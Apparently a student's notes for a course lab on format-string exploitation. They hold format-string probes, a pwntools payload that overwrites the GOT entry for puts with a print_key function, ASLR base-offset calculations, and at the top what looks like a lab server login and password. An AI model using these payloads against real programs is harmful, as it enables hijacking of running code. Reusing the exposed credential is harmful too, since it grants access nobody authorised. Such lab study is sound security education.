# Lab 05
```
lab05@52.201.10.159
9a6d5757
```

input: `AAAA%1$x.%2$x`
output: `AAAAbfde5820.41414141`

```
$ nm crackme0x00 | grep secret
0804a050 D secret
```

```
AAAA%1$p.%2$p
AAAA%1$s.%2$s
AAAA%1$x.%2$x
```

```
$ python2 -c "from pwn import*; print(fmtstr_payload(4, {0xaaaaaaaa: 0xc0ffee}, 10))"
\xaa\xaa\xaa\xaa\xab\xaa\xaa\xaa\xac\xaa\xaa\xaa\xad\xaa\xaa\xaa%212c%4$hhn%17c%5$hhn%193c%6$hhn%64c%7$hhn
```

# Tutorial
1. First we needed to find the offset. Wrote some python code to find this in `tut/jake.py`.
	Or:
```
def exec_fmt(payload):
    p = process(exe)
    p.sendline(payload)
    return p.recvall()

def getOffset():
    return FmtStr(exec_fmt).offset

# Find our addresses
target_binary = ELF(exe)
printKeyAddr = target_binary.symbols['print_key']
putsAddr = target_binary.got['puts']
secretAddr = target_binary.symbols['secret']
writes = {secretAddr: 0x0, putsAddr: printKeyAddr}

# Create payload
padding = "bb"
payload = padding +fmtstr_payload(getOffset(),
                                  writes,
                                  numbwritten=15+5,
                                  write_size='byte')
```
1. Next, we find the number of bytes written (numbwritten) still not sure what this meant. Just need to bruteforce it.
1. Try to write to our address.

# libbase
Need to account for ASLR

## Running commands:
```
./target < <(cyclic 500)
r < <(cyclic 500)
```

## thoughts
stack address -> GOT address -> real address

Using the leaked address that we see on the stack and the static address in the objdump, we can find the randomized offset.

We can also keep calling main and it wont keep randomizing.

# Moving Target
base address of SO              // b main; info proc mappings
+ offset                        // readelf -s | grep my_func 
= position of code at runtime   //

base_addr_libc = 0xf7de8000
offset_jump_to_here = 0x824

# References
## READ THIS
* [Bypassing ASLR and DEP](https://codingvision.net/security/bypassing-aslr-dep-getting-shells-with-pwntools)
* [poor canary](https://github.com/ENOFLAG/writeups/blob/master/hxpctf2018/poor_canary.md)
* [Good string format tutorial](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)
* [Lab tutorial](https://tc.gts3.org/cs6265/2020-spring/tut/tut05-fmtstr.html)
* [The Advanced Return-into-lib(c) Exploits](http://phrack.org/issues/58/4.html)
* [Stack Smashing as of Today](docs/Blackhat-Europe-2009-Fritsch-Bypassing-aslr-slides.pdf)
* [Exploiting Format String Vulnerabilities](docs/formatstring-1.2.pdf)
* [pwntools-snippets](https://github.com/tnballo/notebook/wiki/Pwntools-Snippets)
